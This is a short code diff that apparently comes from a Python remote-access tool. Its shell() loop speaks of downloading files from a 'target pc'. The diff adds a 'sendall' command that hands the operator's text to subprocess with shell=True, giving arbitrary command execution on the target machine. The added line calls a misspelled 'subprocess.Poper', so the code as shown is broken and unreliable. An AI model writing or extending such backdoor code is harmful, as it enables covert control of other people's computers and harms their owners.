@@ -62,6 +62,8 @@ def shell():
             continue
         if command == "exit":
             break
+        elif command[:7] == "sendall":
+            subprocess.Poper(command[8:], shell=True)
         elif command == "help":
             help_options = '''
             download path --> Download a file from target pc
